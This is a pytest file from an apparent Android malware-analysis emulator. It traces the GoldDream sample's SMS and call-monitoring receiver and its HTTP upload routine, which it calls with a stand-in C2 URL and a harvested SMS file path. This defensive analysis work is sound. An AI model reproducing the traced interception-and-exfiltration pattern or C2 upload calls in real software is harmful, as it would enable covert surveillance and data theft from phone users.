# -*- coding: utf-8 -*-
# This file is part of DexTrace - https://github.com/ev-flow/DexTrace
# See the file 'LICENSE' for copying permission.

"""
GoldDream integration test — Android API stub coverage for two malware threats.

Threat 1: Monitor SMS messages and phone calls
  Method: Lcom/sjhi/client/zjReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V
  Expected trace APIs: SmsMessage.createFromPdu, getOriginatingAddress, getDisplayMessageBody,
                       getTimestampMillis, Context.openFileOutput (SMS path)
                       TelephonyManager.getCallState (call monitoring path)

Threat 2: Upload SMS messages and phone calls to remote servers
  Method: Lcom/sjhi/client/e;->a(Ljava/lang/String;Ljava/lang/String;)V
  Expected trace APIs: URL.openConnection, HttpURLConnection.setRequestMethod,
                       HttpURLConnection.getOutputStream, DataOutputStream.writeBytes,
                       FileInputStream.read

One-liner verification (after activating the venv):
  python -c "
import sys; sys.path.insert(0,'tests/fixtures')
from golddream_fetcher import get_apk_path
from pathlib import Path; from dextrace.cli._io import load_dex_bytes
from dextrace.core.dex_resolver import DexResolver
from dextrace.core.dex_code_map import build_sig_to_codeoff_map
from dextrace.vm.engine import DalvikVM
dex,_ = load_dex_bytes(get_apk_path()); vm = DalvikVM(dex, DexResolver(dex), build_sig_to_codeoff_map(dex, DexResolver(dex)))
vm.run('Lcom/sjhi/client/zjReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V', args=['', 0, 'android.provider.Telephony.SMS_RECEIVED'])
assert any('createFromPdu' in c['api'] for c in vm.api_calls); print('OK')"
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_FIXTURES = Path(__file__).parent / "fixtures"

from dextrace.cli._io import load_dex_bytes
from dextrace.core.dex_code_map import build_sig_to_codeoff_map
from dextrace.core.dex_resolver import DexResolver
from dextrace.vm.engine import DalvikVM

ON_RECEIVE = (
    "Lcom/sjhi/client/zjReceiver;"
    "->onReceive(Landroid/content/Context;Landroid/content/Intent;)V"
)
E_A = "Lcom/sjhi/client/e;->a(Ljava/lang/String;Ljava/lang/String;)V"


@pytest.fixture(scope="module")
def golddream_vm():
    if str(_FIXTURES) not in sys.path:
        sys.path.insert(0, str(_FIXTURES))
    from golddream_fetcher import FetcherError, get_apk_path  # noqa: PLC0415

    try:
        apk_path = get_apk_path()
    except FetcherError as exc:
        pytest.skip(f"GoldDream APK unavailable: {exc}")
    dex, _ = load_dex_bytes(apk_path)
    resolver = DexResolver(dex)
    return DalvikVM(dex, resolver, build_sig_to_codeoff_map(dex, resolver))


class TestThreat1MonitorSms:
    """Threat 1 — SMS monitoring path."""

    def test_sms_received_trace(self, golddream_vm):
        vm = golddream_vm
        vm.run(
            ON_RECEIVE,
            args=["", 0, "android.provider.Telephony.SMS_RECEIVED"],
        )
        apis = [c["api"] for c in vm.api_calls]
        assert any(
            "createFromPdu" in a for a in apis
        ), "SmsMessage.createFromPdu not captured"
        assert any(
            "getOriginatingAddress" in a for a in apis
        ), "getOriginatingAddress not captured"
        assert any(
            "getDisplayMessageBody" in a for a in apis
        ), "getDisplayMessageBody not captured"
        assert any(
            "getTimestampMillis" in a for a in apis
        ), "getTimestampMillis not captured"
        assert any(
            "openFileOutput" in a for a in apis
        ), "openFileOutput not captured"

    def test_call_state_trace(self, golddream_vm):
        vm = golddream_vm
        vm.run(
            ON_RECEIVE,
            args=["", 0, "android.intent.action.PHONE_STATE"],
        )
        apis = [c["api"] for c in vm.api_calls]
        assert any(
            "getCallState" in a for a in apis
        ), "TelephonyManager.getCallState not captured"
        assert any(
            "getSystemService" in a for a in apis
        ), "Context.getSystemService not captured"


class TestThreat2UploadToServer:
    """Threat 2 — HTTP upload path."""

    def test_upload_trace(self, golddream_vm):
        vm = golddream_vm
        vm.run(
            E_A,
            args=["http://c2.example.com/upload", "/data/zjsms.txt"],
        )
        apis = [c["api"] for c in vm.api_calls]
        assert any(
            "openConnection" in a for a in apis
        ), "URL.openConnection not captured"
        assert any(
            "setRequestMethod" in a for a in apis
        ), "setRequestMethod not captured"
        assert any(
            "getOutputStream" in a for a in apis
        ), "getOutputStream not captured"
        assert any(
            "writeBytes" in a for a in apis
        ), "DataOutputStream.writeBytes not captured"
        assert any(
            "read" in a for a in apis
        ), "FileInputStream.read not captured"
